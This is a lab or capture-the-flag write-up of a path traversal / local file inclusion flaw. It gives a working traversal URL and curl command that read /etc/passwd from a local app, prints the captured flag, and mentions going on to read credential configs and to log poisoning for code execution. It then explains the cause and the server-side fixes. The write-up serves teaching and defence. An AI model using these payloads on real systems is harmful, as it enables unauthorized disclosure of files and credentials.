# 04. Path Traversal → Local File Inclusion (LFI)

**One-liner:** The app takes `?page=...` from the URL and uses it as a filesystem path. By injecting `../` sequences, we include `/etc/passwd` and the server prints it — with the flag.

---

## Where

* **URL:** `http://127.0.0.1:8080/?page=/../../../../../../../etc/passwd`
* **Param:** `page` (GET)
* **Auth:** none

---

## How to reproduce

1. Open:

   ```
   http://127.0.0.1:8080/?page=/../../../../../../../etc/passwd
   ```

   or via cURL:

   ```bash
   curl -i 'http://127.0.0.1:8080/?page=/../../../../../../../etc/passwd'
   ```
2. The response shows the contents of `/etc/passwd`.

**Observed:** token/flag present in the output

```
b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

---

## Why this happens

* **User‑controlled path:** The server builds a file path directly from `page` (e.g., `include($_GET['page'])` or `readfile($base.$page)`), **without normalizing or restricting it**.
* **Path traversal:** `../` steps escape the intended directory and reach arbitrary files under `/` (root filesystem).
* **No allow‑list / prefix check:** Absolute paths and traversal segments are not blocked; stream wrappers may also be reachable.

---

## Impact

* **Read arbitrary files** the web process can access: credentials, source code, configs, keys.

  * Examples to test in labs (do not commit secrets):

    * App config (DB creds), e.g., `config.php`, `wp-config.php`.
    * Source files to find hidden routes/secrets.
    * Logs for **log poisoning** → potential RCE if the app later `include`s logs.
* If the app uses `include/require` on the user path, including a file that contains PHP code can lead to **code execution**.

**Severity:** High (no auth, trivial, system file disclosure → possible step toward RCE).

---

## What is `/etc/passwd` and why is it readable?

* **Purpose:** On Unix/Linux, `/etc/passwd` maps user names to numeric IDs (UID/GID), with home directory and login shell.
* **Format:** `username:x:UID:GID:comment:home:shell` (e.g., `root:x:0:0:root:/root:/bin/bash`).
* **Passwords?** Historically held password hashes; now most systems store hashes in **`/etc/shadow`** (root‑only). `/etc/passwd` remains **world‑readable** because many system utilities need it to translate user IDs → names.
* **So why is it here?** Seeing `/etc/passwd` in the HTTP response proves the server read a **real OS file** due to LFI/path traversal.

---

## Fix (server‑side — mandatory)

1. **Don’t use raw user input for file paths.** Instead, map **keys** to **known templates**:

   * Accept only values like `home`, `about`, `contact`, then `include($map[$key])`.
2. If dynamic paths are unavoidable, **normalize and enforce a base directory**:

   * Resolve with `realpath()`, verify it starts with your allowed base (e.g., `/var/www/app/templates/`).
   * **Reject** any path containing traversal (`../`, `..\\`), absolute paths, or stream wrappers (`php://`, `data:`, `zip://`, `expect:`).
   * Enforce an **extension allow‑list** (e.g., only `.php` from `templates/`).
3. **Harden PHP / server:**

   * Disable `allow_url_include`; consider `open_basedir`/chroot.
   * Run with least privilege; deny read on sensitive files where possible.
4. **Error handling:** Return generic errors on invalid pages; don’t echo raw file contents.

---

## References

* OWASP Cheat Sheet: **Path Traversal**; **File Inclusion**
* CWE‑22: **Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')**
* CWE‑98: **Improper Control of Filename for Include/Require Statement in PHP**
* CWE‑73: **External Control of File Name or Path**
